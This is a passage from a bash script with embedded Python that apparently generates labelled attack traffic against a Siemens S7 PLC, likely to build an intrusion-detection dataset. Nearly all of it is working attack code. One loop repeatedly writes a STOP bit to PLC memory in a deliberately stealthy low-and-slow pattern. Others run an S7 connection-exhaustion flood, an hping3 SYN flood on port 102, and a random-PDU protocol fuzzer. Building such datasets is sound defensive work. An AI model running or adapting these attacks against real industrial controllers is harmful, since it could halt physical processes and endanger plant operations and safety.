        label "SENSOR_SPOOF" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 7. STEALTHY_WRITE (10m)
        label "STEALTHY_WRITE" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_bool
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[STEALTHY] Low-and-slow: writing STOP bit every 2s', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 2, 1)
        set_bool(m, 0, 2, 1)
        c.write_area(Areas.MK, 0, 2, m)
        n += 1
        if n % 15 == 0:
            print(f'[STEALTHY] {n} writes: M2.2=STOP=1', flush=True)
    except: pass
    time.sleep(2)
PYEOF
        SW=$!; PIDS+=("$SW")
        wait_s 600 "STEALTHY_WRITE"
        kill "$SW" 2>/dev/null || true
        restore_plc
        label "STEALTHY_WRITE" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 8. S7_FLOOD (10m)
        label "S7_FLOOD" "START"
        $PY_CMD - <<PYEOF &
import snap7, time, threading
n_ok = 0
n_fail = 0
lock = threading.Lock()
def flood_worker():
    global n_ok, n_fail
    while True:
        try:
            c = snap7.client.Client()
            c.connect('$TARGET_IP', 0, 1)
            time.sleep(0.1)
            c.disconnect()
            with lock:
                n_ok += 1
                if n_ok % 100 == 0:
                    print(f'[FLOOD] {n_ok} connections, {n_fail} fails', flush=True)
        except:
            with lock: n_fail += 1
threads = [threading.Thread(target=flood_worker, daemon=True) for _ in range(8)]
for t in threads: t.start()
print('[FLOOD] 8 threads flooding S7 connections (limit: 6-8)', flush=True)
for t in threads: t.join()
PYEOF
        FP=$!; PIDS+=("$FP")
        wait_s 600 "S7_FLOOD"
        kill "$FP" 2>/dev/null || true
        restore_plc
        label "S7_FLOOD" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 9. SYN_FLOOD (10m)
        label "SYN_FLOOD" "START"
        if command -v hping3 &>/dev/null; then
            hping3 -S -p 102 --flood "$TARGET_IP" >/dev/null 2>&1 &
            SFP=$!; PIDS+=("$SFP")
            echo "[att] hping3 SYN flood started"
        else
            echo "[WARN] hping3 khong co, dung python socket thay"
            $PY_CMD - <<PYEOF &
import socket, threading, time
def syn_worker():
    while True:
        try:
            s = socket.socket()
            s.settimeout(0.05)
            s.connect(('$TARGET_IP', 102))
            s.close()
        except: pass
threads = [threading.Thread(target=syn_worker, daemon=True) for _ in range(30)]
for t in threads: t.start()
print('[SYN] 30 threads flooding port 102', flush=True)
for t in threads: t.join()
PYEOF
            SFP=$!; PIDS+=("$SFP")
        fi
        wait_s 600 "SYN_FLOOD"
        kill "$SFP" 2>/dev/null || true
        restore_plc
        label "SYN_FLOOD" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 10. PROTOCOL_FUZZ (10m)
        label "PROTOCOL_FUZZ" "START"
        $PY_CMD - <<PYEOF &
import socket, os, time
n = 0
print('[FUZZ] Sending malformed S7 PDUs to port 102', flush=True)
while True:
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect(('$TARGET_IP', 102))
        s.send(os.urandom(50))
        s.close()
        n += 1
        if n % 50 == 0:
            print(f'[FUZZ] {n} malformed PDUs sent', flush=True)
    except: pass
    time.sleep(0.1)
PYEOF
        FZP=$!; PIDS+=("$FZP")
        wait_s 600 "PROTOCOL_FUZZ"
        kill "$FZP" 2>/dev/null || true
        restore_plc
        label "PROTOCOL_FUZZ" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "cooldown"; label "BENIGN_NORMAL" "END"
    fi
}

# ================================================================
case "$ROLE" in
    controller) run_controller ;;
    attacker)   run_attacker   ;;
    *) echo "[ERROR] --role phai la controller hoac attacker"; exit 1 ;;
esac

echo "=== XONG  Day=$DAY  Role=$ROLE  $(date) ==="
